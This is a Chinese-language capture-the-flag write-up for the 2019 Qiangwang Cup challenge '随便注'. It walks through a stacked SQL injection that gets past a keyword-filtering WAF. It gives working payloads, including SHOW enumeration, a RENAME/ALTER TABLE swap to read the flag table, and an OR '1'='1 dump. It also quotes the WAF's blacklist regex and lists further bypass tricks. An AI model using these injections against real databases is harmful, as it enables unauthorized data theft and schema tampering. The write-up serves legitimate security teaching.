# [强网杯 2019]随便注

## 题目概述
题目是一个简单的 SQL 注入页面，提示"开发和安全缺一不可"，注释提示"sqlmap是没有灵魂的"。页面有一个 GET 参数 `inject`，用于查询数据库内容。

## 信息收集
1. 访问页面，发现表单提交 GET 参数 `inject`
2. 测试 `?inject=1` 返回正常数据：`array(2) { [0]=> string(1) "1" [1]=> string(7) "hahahah" }`
3. 测试 `?inject=1'` 触发 SQL 语法错误，确认存在注入点
4. 测试 UNION 注入时发现 WAF 过滤：`return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);`

## 漏洞分析（漏洞类型、原理、判断过程）
- **漏洞类型**：堆叠注入（Stacked Query Injection）
- **原理**：虽然 WAF 过滤了 `select`、`update`、`delete`、`drop`、`insert`、`where` 等关键字，但没有过滤 `show`、`rename`、`alter` 等语句。堆叠注入允许在一条 SQL 语句后追加多条语句，利用分号分隔执行。
- **判断过程**：
  1. 单引号测试报错确认注入点
  2. UNION 注入被 WAF 拦截
  3. 尝试堆叠注入 `;show databases;-- -` 成功执行

## 利用过程（Payload + Flag）

**步骤1：获取数据库列表**
```
?inject=1';show databases;-- -
```
发现 `supersqli` 数据库

**步骤2：获取表名**
```
?inject=1';show tables from supersqli;-- -
```
发现两个表：`words` 和 `1919810931114514`

**步骤3：获取可疑表结构**
```
?inject=1';show columns from `1919810931114514`;-- -
```
发现该表有 `flag` 字段

**步骤4：利用 RENAME 和 ALTER 绕过 SELECT 过滤**
```
?inject=1';RENAME TABLE words TO words1;RENAME TABLE `1919810931114514` TO words;ALTER TABLE words ADD id int(10);-- -
```
原理：原查询语句为 `SELECT * FROM words WHERE id='$inject'`，通过将含 flag 的表重命名为 `words`，原查询就能直接读取 flag。

**步骤5：获取 Flag**
```
?inject=1' or '1'='1
```
返回：`flag{5a77ba75-06e9-4723-b04f-e9780842e433}`

## 复现步骤
1. 访问题目 URL
2. 测试注入点：`?inject=1'`
3. 使用堆叠注入获取数据库信息
4. 利用 RENAME/ALTER 修改表结构绕过 SELECT 过滤
5. 查询获取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| 堆叠注入 | GET 参数 inject | `';RENAME TABLE...;ALTER TABLE...;-- -` | WAF 绕过、表重命名 |

## 知识总结（解题技巧、同类题型套路）
1. **堆叠注入适用场景**：当 UNION、报错、盲注等方法受限时，尝试堆叠注入
2. **WAF 绕过思路**：分析过滤的关键字，寻找未过滤的语句（如 `show`、`rename`、`alter`、`handler` 等）
3. **表重命名技巧**：当无法直接 SELECT 时，可通过修改表结构让原查询语句读取目标数据
4. **同类题型套路**：
   - 使用 `handler` 语句：`handler table_name open; handler table_name read first;`
   - 使用预处理语句：`prepare stmt from 'select * from table'; execute stmt;`
   - 十六进制编码绕过关键字检测
